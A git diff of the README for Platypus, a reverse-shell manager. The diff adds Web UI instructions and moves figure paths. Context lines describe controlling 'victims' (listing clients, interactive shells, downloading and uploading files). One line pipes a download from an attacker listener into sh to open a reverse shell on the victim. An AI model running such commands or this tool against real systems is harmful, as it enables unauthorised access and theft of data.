@@ -21,6 +21,7 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
   - [x] Using CTRL+C and CTRL+Z in reverse shell
 - [x] Start servers automatically
 - [x] Initialize from configuration file
+- [x] Web UI
 
 
 ## Get Start
@@ -77,7 +78,7 @@ restful:
 update: false
 ```
 
-![](./figure/start.gif)
+![](./figure/cli/start.gif)
 
 As you can see, platypus will check for updates, then start listening on port 1337, 1338 and 7331
 
@@ -99,19 +100,33 @@ curl http://192.168.88.129:1337/|sh
 
 Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
 
-![](./figure/connect.gif)
+![](./figure/cli/connect.gif)
 
 > Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.
 
-### Controlling the victim
+## Get start with Web UI
 
-#### List all victims
+### Manage listening port
+
+![](./figure/webui/add.gif)
+
+### Wait for client connection
+
+![](./figure/webui/wait.gif)
+
+### Popup an interactive shell
+
+![](./figure/webui/shell.gif)
+
+## Get start with cli
+
+### List all victims
 
 You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `1337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `1338` will not reset such connections, which provide more repliability.
 
-![](./figure/list.gif)
+![](./figure/cli/list.gif)
 
-#### Select a victim
+### Select a victim
 
 `Jump` command can take you a tour between clients.
 Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
@@ -119,43 +134,43 @@ Also, for jumping through `HASH`, you do not need to type the whole hash, just p
 
 > All commands are case insensitive, feel free to use tab for completing.
 
-![](./figure/jump.gif)
+![](./figure/cli/jump.gif)
 
 
-#### Interactive shell
+### Interactive shell
 
 `Interact` will popup a shell, just like `netcat`.
 
-![](./figure/interact.gif)
+![](./figure/cli/interact.gif)
 
-#### Download file
+### Download file
 
 Use `Download` command to download file from reverse shell client to attacker's machine.
 
-![](./figure/download.gif)
+![](./figure/cli/download.gif)
 
-#### Upload file
+### Upload file
 
 Use `Upload` command to upload file to the current interacting client.
 
-![](./figure/upload.gif)
+![](./figure/cli/upload.gif)
 
-#### Interactive shell mode
+### Interactive shell mode
+
+> This feature only works on *nix clients
 
 Try to Spawn `/bin/bash` via Python, then the shell is fully interactive (You can use vim / htop and other stuffs).
 First use `Jump` to select a client, then type `PTY`, then type `Interact` to drop into a fully interactive shell.
 You can just simply type `exit` to exit pty mode.
 
-![](./figure/interactive.gif)
+![](./figure/cli/interactive.gif)
 
-### Advanced [Usages](./doc)
+
+## Advanced [Usages](./doc)
 
 * Reverse shell as a Service (RaaS)
 * RESTful API
 * Python SDK
-
-#### Using `VIM` in Reverse Shell (Only on `Linux`)
-> Demonstration is to be done.
 
 ## Other Materials
 
@@ -176,10 +191,10 @@ You can just simply type `exit` to exit pty mode.
 - [ ] Use HR package to detect the status of client (maybe `echo $random_string`)
 - [ ] Provide full kernel API
 - [ ] List file
-- [ ] Web UI
 - [ ] Check exit state in WebSocket
 - [ ] Benchmark
 - [ ] [#24 Upgrading platypus to a system service](https://github.com/WangYihang/Platypus/issues/24)
+- [x] Web UI
 - [x] More interfaces in RESTful API
 - [x] Websocket for Web UI 
 - [x] Continuous Integration
